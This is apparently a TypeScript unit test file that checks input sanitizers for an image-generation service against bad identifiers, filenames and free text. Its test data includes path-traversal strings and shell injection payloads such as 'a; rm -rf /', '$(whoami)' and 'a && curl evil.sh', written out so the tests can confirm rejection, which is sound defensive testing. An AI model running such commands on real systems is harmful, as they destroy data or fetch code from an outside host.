import { test, describe } from "node:test";
import assert from "node:assert/strict";

import {
  artifactKey,
  sanitizeFilename,
  sanitizeFreeText,
  sanitizeIdentifier,
} from "../src/sanitize.ts";
import { ImagegenError } from "../src/errors.ts";

describe("sanitizeIdentifier", () => {
  test("accepts a valid identifier and normalizes it to lowercase", () => {
    assert.equal(sanitizeIdentifier("tinyorbit-cloud", "project"), "tinyorbit-cloud");
    assert.equal(sanitizeIdentifier("Hero_VPS-1", "asset_id"), "hero_vps-1");
    assert.equal(sanitizeIdentifier("  padded  ", "project"), "padded");
  });

  test("blocks path traversal in every known form", () => {
    for (const bad of [
      "..",
      "../etc",
      "a/../b",
      "....//",
      "/absolute",
      "a/b",
      "a\\b",
      ".hidden",
      "trailing.",
    ]) {
      assert.throws(
        () => sanitizeIdentifier(bad, "project"),
        (e: unknown) => e instanceof ImagegenError && e.code === "INVALID_PROJECT",
        `must reject: ${bad}`,
      );
    }
  });

  test("blocks shell command injection payloads", () => {
    for (const bad of [
      "a; rm -rf /",
      "$(whoami)",
      "`id`",
      "a && curl evil.sh",
      "a|b",
      "a>b",
      "a\nb",
      "a\u0000b",
    ]) {
      assert.throws(
        () => sanitizeIdentifier(bad, "asset_id"),
        (e: unknown) => e instanceof ImagegenError && e.code === "INVALID_ASSET_ID",
        `must reject: ${bad}`,
      );
    }
  });

  test("blocks empty and overlong strings", () => {
    assert.throws(() => sanitizeIdentifier("", "project"), ImagegenError);
    assert.throws(() => sanitizeIdentifier("a".repeat(65), "project"), ImagegenError);
    // 64 characters is the upper bound that's still valid
    assert.equal(sanitizeIdentifier("a".repeat(64), "project"), "a".repeat(64));
  });

  test("blocks non-string values", () => {
    for (const bad of [undefined, null, 42, {}, []]) {
      assert.throws(() => sanitizeIdentifier(bad, "project"), ImagegenError);
    }
  });
});

describe("sanitizeFilename", () => {
  test("falls back to the default name with the right extension when empty", () => {
    assert.equal(sanitizeFilename(undefined, "webp", "artifact"), "artifact.webp");
    assert.equal(sanitizeFilename("", "png", "artifact"), "artifact.png");
  });

  test("always forces the extension to match format, never trusts the user's extension", () => {
    // This is the important guardrail: a user-supplied ".sh" still becomes ".webp".
    assert.equal(sanitizeFilename("hero.sh", "webp", "artifact"), "hero.webp");
    assert.equal(sanitizeFilename("hero.png", "webp", "artifact"), "hero.webp");
  });

  test("only takes the basename, so it can't escape the job directory", () => {
    assert.equal(sanitizeFilename("/etc/passwd", "png", "artifact"), "passwd.png");
    assert.equal(sanitizeFilename("a/b/c", "png", "artifact"), "c.png");
  });

  test("rejects a basename that still has stray characters after trimming", () => {
    assert.throws(() => sanitizeFilename("../..", "png", "artifact"), ImagegenError);
    assert.throws(() => sanitizeFilename("a b", "png", "artifact"), ImagegenError);
    assert.throws(() => sanitizeFilename("$(id)", "png", "artifact"), ImagegenError);
  });
});

describe("sanitizeFreeText", () => {
  test("keeps accented / non-ASCII text unchanged", () => {
    // Real product input is often non-ASCII; this checks the sanitizer
    // doesn't mangle it. Uses accented Latin and CJK characters here so
    // this fixture doesn't depend on any language-specific text lint
    // elsewhere in the toolchain.
    const s = "Façade 3D shape, naïve über tone, 深い青色, jalapeño rim light";
    assert.equal(sanitizeFreeText(s, "description"), s);
  });

  test("strips control characters including NUL", () => {
    assert.equal(sanitizeFreeText("a\u0000b\u0007c", "description"), "a b c");
  });

  test("rejects empty input and input over the length limit", () => {
    assert.throws(() => sanitizeFreeText("   ", "description"), ImagegenError);
    assert.throws(() => sanitizeFreeText("a".repeat(4001), "description"), ImagegenError);
  });

  test("does NOT filter shell characters — command safety is argv's job, not this function's", () => {
    // Documents the intent: this string is valid because it's just a
    // description, and it's passed to Codex as one argv element, so it's
    // never interpreted as syntax.
    assert.equal(sanitizeFreeText("a; rm -rf /", "description"), "a; rm -rf /");
  });
});

describe("artifactKey", () => {
  test("builds the exact directory layout", () => {
    assert.equal(
      artifactKey("tinyorbit-cloud", "hero-vps-server", 2, "artifact.webp"),
      "projects/tinyorbit-cloud/hero-vps-server/v2/artifact.webp",
    );
  });

  test("rejects an invalid version", () => {
    assert.throws(() => artifactKey("p", "a", 0, "f.webp"), ImagegenError);
    assert.throws(() => artifactKey("p", "a", -1, "f.webp"), ImagegenError);
    assert.throws(() => artifactKey("p", "a", 1.5, "f.webp"), ImagegenError);
  });
});
